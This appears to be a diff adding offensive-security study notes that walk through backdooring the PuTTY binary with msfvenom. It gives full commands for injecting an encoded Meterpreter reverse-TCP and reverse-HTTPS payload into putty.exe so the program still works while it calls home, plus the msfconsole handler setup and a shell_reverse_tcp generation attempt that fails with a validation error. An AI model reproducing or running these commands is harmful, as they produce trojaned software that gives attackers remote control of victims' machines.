@@ -1,0 +1,32 @@
+msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
+
+generate -b '\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b'
+
+generate -b '\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b\xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26'
+
+msfvenom -p windows/meterpreter/reverse_https -f exe -e x86/shikata_ga_nai -i 25 -k -x /var/www/lulz/putty.exe LHOST=192.168.1.41 LPORT=443 >evilputty.exe
+
+We use the “msfvenom” utility, the “Reverse HTTPS Meterpreter” payload for Windows, and set the format (-f) to “exe” for “exe file”. We set the encoder to x86/shikata_ga_nai and tell it to encode the payload 25 times. We also specify the LHOST and LPORT for the backdoor to “Phone Home” to.
+
+Now for the special secret ninja sauce.
+
+The -x switch tells it what “template EXE” to use, so we specify the Putty binary we downloaded. This tells it to inject the malicious code into the Putty binary.
+
+The -k switch is even cooler, tells it to run the malicious code in a remote thread in order to not fuck with the functionality of the Putty program we just backdoored.
+
+So, lets test it!
+
+First off we start msfconsole, and give it the following commands.
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set lport 443
+set lhost 192.168.1.41 (our local host, change this if needed)
+exploit
+
+Now when the victim host runs our backdoored Putty binary, they will see Putty functioning normally… However in the background… We own their box.
+
+root@kali:/mnt/hgfs/OSCE/Exercises/0day# msfvenom -a x86 -p windows/shell_reverse_tcp EXITFUNC=SEH LPORT=443 LHOST=192.168.98.36 -b "\x00" -f python
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+Error: The following options failed to validate: EXITFUNC.
+
